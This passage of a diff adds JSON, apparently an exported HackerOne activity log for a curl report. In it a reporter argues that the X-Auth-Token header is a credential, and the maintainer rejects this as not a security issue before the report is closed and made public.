+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16691474,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "At present, there are only cookie, authorization, proxy authorization and x-auth-token authentication methods for HTTP protocol authentication, which should be pay attention to this questions.",
+            "automated_response": false,
+            "created_at": "2022-05-13T14:32:41.714Z",
+            "updated_at": "2022-05-13T14:32:41.714Z",
+            "actor": {
+                "username": "iylz",
+                "cleared": false,
+                "verified": false,
+                "url": "/iylz",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16691552,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "In this forum we restrict ourselves to work purely with security related problems. This is not such a problem. This seems to work both as intended and as documented.\n\nIf you want to argue that curl should treat this header differently then that is a discussion to bring to the curl community, possibly as a pull-request, a discussion post or a mail to the mailing list.\n\nThis said, you will find me reluctant to add more headers to get special treatment. *Especially* headers that are not even in any HTTP RFC.",
+            "automated_response": false,
+            "created_at": "2022-05-13T14:38:32.549Z",
+            "updated_at": "2022-05-13T14:38:32.549Z",
+            "actor": {
+                "username": "bagder",
+                "cleared": false,
+                "verified": false,
+                "url": "/bagder",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/y9xzl5ayi7du4kz3l6pa6sff2ha5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22final-12-1000x1000.jpg%22%3B%20filename%2A%3DUTF-8%27%27final-12-1000x1000.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVJOTSA3A%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070208Z&X-Amz-Expires=485&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBoV20obGAJNEUzT9%2BNCZi4BzOqzwzcOPOUTeKZbmpyaAiAajgHs6bs8zOhp4DAnYOdWg%2BraHXWSuNo6jYMwuN7RcSq5BQia%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM4osjXoSinMB0BYr0Ko0FRZs5xCx%2B9YCc8fb2KK4e%2B76kpvgelGsIR0VZg%2BMyP3DxZM4hbf29ENluxoylQ6P1RQjbJrzChD7gM8oZjDj7Hpx95OKuaCFKHkEGh9cSJGLUokibcQcnkZ5Rcg5J33wdFJd3%2FJZ%2BuzM5KKEmO8VUir9Qv748WuiO8LwJ%2BWzAXHVKxSr2Y%2F1KYALoJlQm5Ucvidyz2lok08uMKdQhoLMacFy0gwcF4wdR2OFjpEd0%2FGjWQQOlGIYUL4pUM09PZZ9ScEdX2E4%2Bjmg8V6BRXjYN9wzSLbGuxDHJCqaJj1d2TAj4YL1q2ljYDmIUCc6qFiGXtdRQnCcNu4pQrgZzu9CBfC9DFLhxfwFtEEzza3YS0Q6am9nk1B2tJlJxCBwTyuT%2B6M9YINul9VNyb6QUR%2BMjdmR7YE%2BM8Ls%2FaBYl74%2BUb52WsJSca%2FxRPeDX0j9OZcUnZnfURiGNQ%2B4Je%2FMTBtmXQ%2BNkhd3T7f8VgKHPq7YmAjKbPCXcFp0oST2ja52OwfcWUuEtby%2BJPYZ1DMtdplSF4XP8DktBMWExP9y2IRQVWtkILrHz0AVNUCJE6NVYRYcLQ5kWMN8MiRKWAaECf7fWPykocWKY4IvToQy0Vvqi%2F8f4gVQCWbgNXbhqIlrjXz78vvmexkrRqflEY3Bm7Cpp2JDhKpJpCxlUmc%2FBwmaCgDtdRIuogyPUgkbjWLzoev%2BsAEBAqzkpSRe50iz2Jqqm6zELzv%2F7MAXVqTwSvYs%2FV%2FSt75zx%2Fn3Fa0qBXNr6NdR7ksTH1uhpcCK2S0Cq9cb%2BJ4rKmJJ35HZoRLGNbCOOreyCIKepyJhgjQWee%2Bbrg3DMxc4fN33ulIfdILqxsZBgNtZ6U1oUJUMbcLMtbqIw44W1pwY6sgHkTfEYhn15tDODnENz23ZwyKh2Qupe%2FxI8152twqcrvtBIWaQBYPRIgX7IRMCclQ3aqDDb3ynn6pfMdBG%2FOxVha1FG6JEX3lKGRLGA%2FNP1WczWaca%2BaPJ23cLcbZAyAzKzckvI1%2BmE1pH6%2BbFLVSiK0Go1FBqAvipHyJdIMaOhpQZrnD4u0xJ%2BT4IHx0enLGl0koBQrdojfD5OnlBt8MRf%2B6qJ462EK5YTOaPU4u59H1QO&X-Amz-SignedHeaders=host&X-Amz-Signature=1216f02a5e3fda3e9fc7dfc78668538e3054ec4174e2cccbfd78d834123d9073"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16691618,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I think x-auth-token header is widely used for authentication and authorization, which is a security issue. even if it's not in the HTTP RFC. Thanks.",
+            "automated_response": false,
+            "created_at": "2022-05-13T14:43:58.924Z",
+            "updated_at": "2022-05-13T14:43:58.924Z",
+            "actor": {
+                "username": "iylz",
+                "cleared": false,
+                "verified": false,
+                "url": "/iylz",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16698919,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugNotApplicable",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-05-13T20:32:49.968Z",
+            "updated_at": "2022-05-13T20:32:49.968Z",
+            "actor": {
+                "username": "bagder",
+                "cleared": false,
+                "verified": false,
+                "url": "/bagder",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/y9xzl5ayi7du4kz3l6pa6sff2ha5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22final-12-1000x1000.jpg%22%3B%20filename%2A%3DUTF-8%27%27final-12-1000x1000.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVJOTSA3A%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070208Z&X-Amz-Expires=485&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBoV20obGAJNEUzT9%2BNCZi4BzOqzwzcOPOUTeKZbmpyaAiAajgHs6bs8zOhp4DAnYOdWg%2BraHXWSuNo6jYMwuN7RcSq5BQia%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM4osjXoSinMB0BYr0Ko0FRZs5xCx%2B9YCc8fb2KK4e%2B76kpvgelGsIR0VZg%2BMyP3DxZM4hbf29ENluxoylQ6P1RQjbJrzChD7gM8oZjDj7Hpx95OKuaCFKHkEGh9cSJGLUokibcQcnkZ5Rcg5J33wdFJd3%2FJZ%2BuzM5KKEmO8VUir9Qv748WuiO8LwJ%2BWzAXHVKxSr2Y%2F1KYALoJlQm5Ucvidyz2lok08uMKdQhoLMacFy0gwcF4wdR2OFjpEd0%2FGjWQQOlGIYUL4pUM09PZZ9ScEdX2E4%2Bjmg8V6BRXjYN9wzSLbGuxDHJCqaJj1d2TAj4YL1q2ljYDmIUCc6qFiGXtdRQnCcNu4pQrgZzu9CBfC9DFLhxfwFtEEzza3YS0Q6am9nk1B2tJlJxCBwTyuT%2B6M9YINul9VNyb6QUR%2BMjdmR7YE%2BM8Ls%2FaBYl74%2BUb52WsJSca%2FxRPeDX0j9OZcUnZnfURiGNQ%2B4Je%2FMTBtmXQ%2BNkhd3T7f8VgKHPq7YmAjKbPCXcFp0oST2ja52OwfcWUuEtby%2BJPYZ1DMtdplSF4XP8DktBMWExP9y2IRQVWtkILrHz0AVNUCJE6NVYRYcLQ5kWMN8MiRKWAaECf7fWPykocWKY4IvToQy0Vvqi%2F8f4gVQCWbgNXbhqIlrjXz78vvmexkrRqflEY3Bm7Cpp2JDhKpJpCxlUmc%2FBwmaCgDtdRIuogyPUgkbjWLzoev%2BsAEBAqzkpSRe50iz2Jqqm6zELzv%2F7MAXVqTwSvYs%2FV%2FSt75zx%2Fn3Fa0qBXNr6NdR7ksTH1uhpcCK2S0Cq9cb%2BJ4rKmJJ35HZoRLGNbCOOreyCIKepyJhgjQWee%2Bbrg3DMxc4fN33ulIfdILqxsZBgNtZ6U1oUJUMbcLMtbqIw44W1pwY6sgHkTfEYhn15tDODnENz23ZwyKh2Qupe%2FxI8152twqcrvtBIWaQBYPRIgX7IRMCclQ3aqDDb3ynn6pfMdBG%2FOxVha1FG6JEX3lKGRLGA%2FNP1WczWaca%2BaPJ23cLcbZAyAzKzckvI1%2BmE1pH6%2BbFLVSiK0Go1FBqAvipHyJdIMaOhpQZrnD4u0xJ%2BT4IHx0enLGl0koBQrdojfD5OnlBt8MRf%2B6qJ462EK5YTOaPU4u59H1QO&X-Amz-SignedHeaders=host&X-Amz-Signature=1216f02a5e3fda3e9fc7dfc78668538e3054ec4174e2cccbfd78d834123d9073"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16700267,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @bagder, x-auth-token header is not in the HTTP RFC document, but it has been used by many websites. Is it really harmless? I think we need to pay more attention to this problem",
+            "automated_response": false,
+            "created_at": "2022-05-14T02:04:46.045Z",
+            "updated_at": "2022-05-14T02:04:46.045Z",
+            "actor": {
+                "username": "iylz",
+                "cleared": false,
+                "verified": false,
+                "url": "/iylz",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16704727,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Anything update?",
+            "automated_response": false,
+            "created_at": "2022-05-14T14:57:32.529Z",
+            "updated_at": "2022-05-14T14:57:32.529Z",
+            "actor": {
+                "username": "iylz",
+                "cleared": false,
+                "verified": false,
+                "url": "/iylz",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16704849,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Let me repeat myself: this is not a curl security problem. If you want to introduce special treatment of other headers than currently, take that discussion to the project. It is not a subject to be debated here.",
+            "automated_response": false,
+            "created_at": "2022-05-14T15:27:14.437Z",
+            "updated_at": "2022-05-14T15:27:14.437Z",
+            "actor": {
+                "username": "bagder",
+                "cleared": false,
+                "verified": false,
+                "url": "/bagder",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/y9xzl5ayi7du4kz3l6pa6sff2ha5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22final-12-1000x1000.jpg%22%3B%20filename%2A%3DUTF-8%27%27final-12-1000x1000.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVJOTSA3A%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070208Z&X-Amz-Expires=485&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBoV20obGAJNEUzT9%2BNCZi4BzOqzwzcOPOUTeKZbmpyaAiAajgHs6bs8zOhp4DAnYOdWg%2BraHXWSuNo6jYMwuN7RcSq5BQia%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM4osjXoSinMB0BYr0Ko0FRZs5xCx%2B9YCc8fb2KK4e%2B76kpvgelGsIR0VZg%2BMyP3DxZM4hbf29ENluxoylQ6P1RQjbJrzChD7gM8oZjDj7Hpx95OKuaCFKHkEGh9cSJGLUokibcQcnkZ5Rcg5J33wdFJd3%2FJZ%2BuzM5KKEmO8VUir9Qv748WuiO8LwJ%2BWzAXHVKxSr2Y%2F1KYALoJlQm5Ucvidyz2lok08uMKdQhoLMacFy0gwcF4wdR2OFjpEd0%2FGjWQQOlGIYUL4pUM09PZZ9ScEdX2E4%2Bjmg8V6BRXjYN9wzSLbGuxDHJCqaJj1d2TAj4YL1q2ljYDmIUCc6qFiGXtdRQnCcNu4pQrgZzu9CBfC9DFLhxfwFtEEzza3YS0Q6am9nk1B2tJlJxCBwTyuT%2B6M9YINul9VNyb6QUR%2BMjdmR7YE%2BM8Ls%2FaBYl74%2BUb52WsJSca%2FxRPeDX0j9OZcUnZnfURiGNQ%2B4Je%2FMTBtmXQ%2BNkhd3T7f8VgKHPq7YmAjKbPCXcFp0oST2ja52OwfcWUuEtby%2BJPYZ1DMtdplSF4XP8DktBMWExP9y2IRQVWtkILrHz0AVNUCJE6NVYRYcLQ5kWMN8MiRKWAaECf7fWPykocWKY4IvToQy0Vvqi%2F8f4gVQCWbgNXbhqIlrjXz78vvmexkrRqflEY3Bm7Cpp2JDhKpJpCxlUmc%2FBwmaCgDtdRIuogyPUgkbjWLzoev%2BsAEBAqzkpSRe50iz2Jqqm6zELzv%2F7MAXVqTwSvYs%2FV%2FSt75zx%2Fn3Fa0qBXNr6NdR7ksTH1uhpcCK2S0Cq9cb%2BJ4rKmJJ35HZoRLGNbCOOreyCIKepyJhgjQWee%2Bbrg3DMxc4fN33ulIfdILqxsZBgNtZ6U1oUJUMbcLMtbqIw44W1pwY6sgHkTfEYhn15tDODnENz23ZwyKh2Qupe%2FxI8152twqcrvtBIWaQBYPRIgX7IRMCclQ3aqDDb3ynn6pfMdBG%2FOxVha1FG6JEX3lKGRLGA%2FNP1WczWaca%2BaPJ23cLcbZAyAzKzckvI1%2BmE1pH6%2BbFLVSiK0Go1FBqAvipHyJdIMaOhpQZrnD4u0xJ%2BT4IHx0enLGl0koBQrdojfD5OnlBt8MRf%2B6qJ462EK5YTOaPU4u59H1QO&X-Amz-SignedHeaders=host&X-Amz-Signature=1216f02a5e3fda3e9fc7dfc78668538e3054ec4174e2cccbfd78d834123d9073"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16704984,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Ok thanks. However, I still think my idea is correct. When x-auth-token header is added to HTTP RFC, I hope curl can fix it. Thank you for your discussion",
+            "automated_response": false,
+            "created_at": "2022-05-14T16:00:34.867Z",
+            "updated_at": "2022-05-14T16:00:34.867Z",
+            "actor": {
+                "username": "iylz",
+                "cleared": false,
+                "verified": false,
+                "url": "/iylz",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16704994,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-05-14T16:01:34.592Z",
+            "updated_at": "2022-05-14T16:01:34.592Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "bagder",
+                "cleared": false,
+                "verified": false,
+                "url": "/bagder",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/y9xzl5ayi7du4kz3l6pa6sff2ha5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22final-12-1000x1000.jpg%22%3B%20filename%2A%3DUTF-8%27%27final-12-1000x1000.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVJOTSA3A%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070208Z&X-Amz-Expires=485&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBoV20obGAJNEUzT9%2BNCZi4BzOqzwzcOPOUTeKZbmpyaAiAajgHs6bs8zOhp4DAnYOdWg%2BraHXWSuNo6jYMwuN7RcSq5BQia%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM4osjXoSinMB0BYr0Ko0FRZs5xCx%2B9YCc8fb2KK4e%2B76kpvgelGsIR0VZg%2BMyP3DxZM4hbf29ENluxoylQ6P1RQjbJrzChD7gM8oZjDj7Hpx95OKuaCFKHkEGh9cSJGLUokibcQcnkZ5Rcg5J33wdFJd3%2FJZ%2BuzM5KKEmO8VUir9Qv748WuiO8LwJ%2BWzAXHVKxSr2Y%2F1KYALoJlQm5Ucvidyz2lok08uMKdQhoLMacFy0gwcF4wdR2OFjpEd0%2FGjWQQOlGIYUL4pUM09PZZ9ScEdX2E4%2Bjmg8V6BRXjYN9wzSLbGuxDHJCqaJj1d2TAj4YL1q2ljYDmIUCc6qFiGXtdRQnCcNu4pQrgZzu9CBfC9DFLhxfwFtEEzza3YS0Q6am9nk1B2tJlJxCBwTyuT%2B6M9YINul9VNyb6QUR%2BMjdmR7YE%2BM8Ls%2FaBYl74%2BUb52WsJSca%2FxRPeDX0j9OZcUnZnfURiGNQ%2B4Je%2FMTBtmXQ%2BNkhd3T7f8VgKHPq7YmAjKbPCXcFp0oST2ja52OwfcWUuEtby%2BJPYZ1DMtdplSF4XP8DktBMWExP9y2IRQVWtkILrHz0AVNUCJE6NVYRYcLQ5kWMN8MiRKWAaECf7fWPykocWKY4IvToQy0Vvqi%2F8f4gVQCWbgNXbhqIlrjXz78vvmexkrRqflEY3Bm7Cpp2JDhKpJpCxlUmc%2FBwmaCgDtdRIuogyPUgkbjWLzoev%2BsAEBAqzkpSRe50iz2Jqqm6zELzv%2F7MAXVqTwSvYs%2FV%2FSt75zx%2Fn3Fa0qBXNr6NdR7ksTH1uhpcCK2S0Cq9cb%2BJ4rKmJJ35HZoRLGNbCOOreyCIKepyJhgjQWee%2Bbrg3DMxc4fN33ulIfdILqxsZBgNtZ6U1oUJUMbcLMtbqIw44W1pwY6sgHkTfEYhn15tDODnENz23ZwyKh2Qupe%2FxI8152twqcrvtBIWaQBYPRIgX7IRMCclQ3aqDDb3ynn6pfMdBG%2FOxVha1FG6JEX3lKGRLGA%2FNP1WczWaca%2BaPJ23cLcbZAyAzKzckvI1%2BmE1pH6%2BbFLVSiK0Go1FBqAvipHyJdIMaOhpQZrnD4u0xJ%2BT4IHx0enLGl0koBQrdojfD5OnlBt8MRf%2B6qJ462EK5YTOaPU4u59H1QO&X-Amz-SignedHeaders=host&X-Amz-Signature=1216f02a5e3fda3e9fc7dfc78668538e3054ec4174e2cccbfd78d834123d9073"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16705020,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-05-14T16:06:25.501Z",
+            "updated_at": "2022-05-14T16:06:25.501Z",
+            "actor": {
+                "username": "iylz",
+                "cleared": false,
+                "verified": false,
+                "url": "/iylz",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16705021,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-05-14T16:06:25.572Z",
+            "updated_at": "2022-05-14T16:06:25.572Z",
+            "actor": {
+                "username": "iylz",
+                "cleared": false,
+                "verified": false,
+                "url": "/iylz",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
